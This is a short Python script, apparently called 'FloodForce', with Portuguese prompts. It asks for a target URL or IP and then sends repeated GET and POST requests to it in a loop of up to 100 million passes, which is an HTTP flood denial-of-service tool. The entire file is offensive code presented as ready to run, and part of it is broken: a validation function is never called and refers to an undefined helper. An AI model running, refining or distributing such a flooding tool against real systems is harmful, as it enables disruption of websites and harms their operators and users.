import requests
import os
import pyfiglet
from colorama import init, Fore, Style, Back

import sys
import time
from urllib.parse import urlparse

class httpFlood:
    def atack(self):
        os.system("cls" if sys.platform == "win32" else "clear")
        
        try:
            def logo():
                try:
                	lg = pyfiglet.figlet_format("FloodForce")
                	print(Fore.YELLOW + f"{lg}"+ Style.RESET_ALL)
                	print(Fore.RED+"Press CTRL'C  OU 'sair' PARA SAIR\n")
                	
                	print(Fore.BLUE+"Author :",Fore.WHITE+"DarkZer0")
                	print(Fore.BLUE+"Github :",Fore.WHITE+"https://github.com/DarkZer0")
                	print(Fore.BLUE+"Source :",Fore.WHITE+"https://github.com/DarkZer0/FloodForce\n")
                	
                except ModuleNotFoundError:
                	print("VOCÊ NÃO TEM O COLORAMA INSTALADO")
                	
            logo()

            try:
                host = input(Fore.CYAN + "Digite o ip ou url (com http:// ou https://): ")
                print("\n")
                
                if not host:
                    print(Fore.YELLOW + "url ou ip em branco!!")
                    time.sleep(1)
                    exit()
                    
                elif host == "sair":
                    print(Fore.RED + "você saiu!")
                    time.sleep(1)
                    exit()
                    
            except Exception as e:
                print(Fore.RED + "ERROR")

            def validar_site(host):
                try:
                	test = requests.get(host)
                	if test.status_code == 200:
                		
                		if validar_url(host):
                			print(Fore.GREEN + "url ou ip validos\n")
                		
                		else:
                			print(Fore.YELLOW + "url ou ip invalidos\n")
                			time.sleep(1)
                			exit()
                			
                except ValueError:
                    print(Fore.RED + "ERRO DE VALOR")
                    exit()

            for i in range(1, 100000000):
                get = requests.get(host)
                post = requests.post(host)
                
                print(Fore.GREEN + f"status do flood:", get.status_code, f"/ quantidade: {i}" + Style.RESET_ALL)
                	
        except KeyboardInterrupt:
            print(Fore.RED + "saindo..." + Style.RESET_ALL)
            time.sleep(2)
            exit()
            
        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"tipo do erro de requests: {e}" + Style.RESET_ALL)

HFD = httpFlood()
HFD.atack()
                    
